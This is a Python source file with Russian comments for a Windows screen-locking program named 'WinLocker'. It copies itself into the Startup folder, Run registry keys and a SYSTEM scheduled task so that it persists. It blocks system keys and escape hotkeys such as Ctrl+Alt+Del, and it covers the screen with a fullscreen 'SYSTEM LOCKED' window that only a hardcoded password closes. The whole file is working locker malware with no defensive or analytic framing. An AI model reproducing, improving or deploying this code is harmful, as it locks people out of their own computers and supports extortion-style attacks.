import tkinter as tk
import random
import time
import threading
import os
import sys
import shutil
import subprocess
import ctypes
import keyboard  # pip install keyboard

# ========== НАСТРОЙКИ ==========
PASSWORD = "12345GOG"
attempts = 0
MAX_ATTEMPTS = 10
running = True
# ================================

# ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# ========== ТРОЙНАЯ АВТОЗАГРУЗКА ==========

def add_to_startup():
    """Добавляет программу в 3 разных места"""
    try:
        if getattr(sys, 'frozen', False):
            current_file = sys.executable
        else:
            current_file = os.path.abspath(__file__)
        
        # 1. Папка автозагрузки
        startup_folder = os.path.join(os.environ['APPDATA'], 
                                      'Microsoft', 'Windows', 'Start Menu', 
                                      'Programs', 'Startup')
        dest_path = os.path.join(startup_folder, "winlocker.exe")
        shutil.copy2(current_file, dest_path)
        
        # 2. Реестр (текущий пользователь)
        subprocess.run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinLocker" /t REG_SZ /d "{dest_path}" /f', 
                      shell=True, capture_output=True)
        
        # 3. Реестр (все пользователи) - если есть права
        if is_admin():
            subprocess.run(f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinLocker" /t REG_SZ /d "{dest_path}" /f', 
                          shell=True, capture_output=True)
        
        # 4. Планировщик задач (для надёжности)
        subprocess.run(f'schtasks /create /tn "WinLockerUpdate" /tr "{dest_path}" /sc onlogon /ru "SYSTEM" /f /rl HIGHEST', 
                      shell=True, capture_output=True)
    except:
        pass

# ========== ТОТАЛЬНАЯ БЛОКИРОВКА КОМБИНАЦИЙ ==========

def block_combinations():
    """Блокирует все опасные комбинации клавиш, но буквы работают"""
    
    system_keys = ['alt', 'ctrl', 'shift', 'windows', 'delete', 'escape', 'tab']
    
    for key in system_keys:
        try:
            keyboard.block_key(key)
        except:
            pass
    
    dangerous_hotkeys = [
        'alt+f4', 'ctrl+alt+del', 'ctrl+shift+esc',
        'ctrl+esc', 'alt+tab', 'windows+r', 'windows+e',
        'alt+space', 'ctrl+c', 'ctrl+v', 'ctrl+x', 'ctrl+z',
        'ctrl+a', 'ctrl+s', 'ctrl+o', 'ctrl+p', 'ctrl+w',
        'ctrl+tab', 'ctrl+shift', 'alt+shift', 'win+space'
    ]
    
    for hotkey in dangerous_hotkeys:
        try:
            keyboard.add_hotkey(hotkey, lambda: None)
        except:
            pass

# ========== ОКНО ==========
root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.configure(bg='black')
root.overrideredirect(True)

canvas = tk.Canvas(root, width=root.winfo_screenwidth(), 
                  height=root.winfo_screenheight(), 
                  bg='black', highlightthickness=0)
canvas.pack()

# ========== ХАКЕРСКИЙ ИНТЕРФЕЙС ==========

def draw_ui():
    canvas.delete("all")
    
    width = root.winfo_screenwidth()
    height = root.winfo_screenheight()
    cx = width // 2
    cy = height // 2
    
    # Фоновый код
    for i in range(50):
        x = random.randint(0, width)
        y = random.randint(0, height)
        canvas.create_text(x, y, text='0x7F', 
                          fill='#0a3a0a', font=("Courier", random.randint(8, 16)))
    
    # Главная панель
    canvas.create_rectangle(cx-300, cy-150, cx+300, cy+200, 
                          outline='#00ff00', width=3, fill='#001100')
    
    # Заголовок
    canvas.create_text(cx, cy-100, text="⚠️ SYSTEM LOCKED ⚠️", 
                      fill='#00ff00', font=("Courier", 30, "bold"))
    
    # Статус
    canvas.create_text(cx, cy, text=f"ATTEMPTS: {attempts}/{MAX_ATTEMPTS}", 
                      fill='#00ff00', font=("Courier", 18))
    canvas.create_text(cx, cy+50, text="ENTER PASSWORD:", 
                      fill='#00ff00', font=("Courier", 16))

# ПОЛЕ ВВОДА
entry = tk.Entry(root, font=("Courier", 18), show="*", 
                width=15, justify='center', bg='black', fg='#00ff00', 
                insertbackground='#00ff00')
entry.place(relx=0.5, rely=0.6, anchor='center')
entry.focus()

error_label = tk.Label(root, text="", font=("Courier", 12), 
                      fg='#00ff00', bg='black')
error_label.place(relx=0.5, rely=0.7, anchor='center')

# ========== ЭКРАН ПЕРЕЗАГРУЗКИ ==========

def show_reboot_screen():
    canvas.delete("all")
    canvas.configure(bg='black')
    
    cx = root.winfo_screenwidth() // 2
    cy = root.winfo_screenheight() // 2
    
    canvas.create_text(cx, cy-100, text="💀 SYSTEM ERROR 💀", 
                      fill='red', font=("Courier", 50, "bold"))
    canvas.create_text(cx, cy, text="TOO MANY FAILED ATTEMPTS", 
                      fill='red', font=("Courier", 30))
    canvas.create_text(cx, cy+80, text="RESTART YOUR COMPUTER", 
                      fill='red', font=("Courier", 30))
    
    entry.place_forget()
    error_label.place_forget()
    
    # Бесконечный цикл - пока не перезагрузят
    while True:
        root.update()
        time.sleep(1)

# ========== ПРОВЕРКА ПАРОЛЯ ==========

def unlock(event=None):
    global attempts
    
    if entry.get() == PASSWORD:
        root.destroy()  # Полное закрытие
        sys.exit()
    else:
        attempts += 1
        error_label.config(text=f"ACCESS DENIED! ATTEMPT {attempts}")
        entry.delete(0, tk.END)
        draw_ui()
        
        if attempts >= MAX_ATTEMPTS:
            show_reboot_screen()

# ========== ЗАПУСК ==========

# Добавляем в автозагрузку
add_to_startup()

# Рисуем интерфейс
draw_ui()

# Запускаем блокировку в фоне
blocking_thread = threading.Thread(target=block_combinations, daemon=True)
blocking_thread.start()

# Привязываем Enter
root.bind('<Return>', lambda e: unlock())

root.mainloop()